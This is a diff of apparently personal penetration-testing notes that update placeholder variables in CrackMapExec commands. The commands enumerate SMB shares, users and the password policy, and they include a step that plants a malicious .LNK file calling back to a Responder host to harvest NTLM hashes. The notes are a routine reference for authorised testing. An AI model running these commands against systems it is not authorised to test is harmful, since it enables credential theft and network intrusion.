@@ -4,44 +4,44 @@ description: Examples of CrackMapExec commands that I use throughout penetration
 
 # CrackMapExec Examples
 
-## Harvest NTLMv2/v1 credentials if you have write-access to a share.
+### Harvest NTLMv2/v1 credentials if you have write-access to a share.
 
 Enumerate the hosts shares
 
 ```bash
-crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] --shares
+crackmapexec smb $ip -u $username -p $password --shares
 ```
 
 Create a malicious .LNK file calling back to your Responder.py IP
 
 ```bash
-crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP]
+crackmapexec smb $ip -u $username -p $password -M slinky -o NAME=$share SERVER=[ResponderIP]
 ```
 
 After waiting and (hopefully) obtaining several NTLM hashes, cleanup the malicious file
 
 ```bash
-crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP] CLEANUP=True
+crackmapexec smb $ip -u $username -p $password -M slinky -o NAME=$share SERVER=$responder_ip CLEANUP=True
 ```
 
-## Null Session Enumeration
+### Null Session Enumeration
 
 Enumerate null sessions:
 
 ```bash
-cme smb [TARGETS] -u '' -p ''
+cme smb $ip -u '' -p ''
 ```
 
 Enumerate domain password policy:
 
 ```bash
-cme smb [TARGET] --pass-pol
+cme smb $ip --pass-pol
 ```
 
 Enumerate users (domain controller)
 
 ```bash
-cme smb [TARGET] --users
+cme smb $ip --users
 ```
 
 ## References
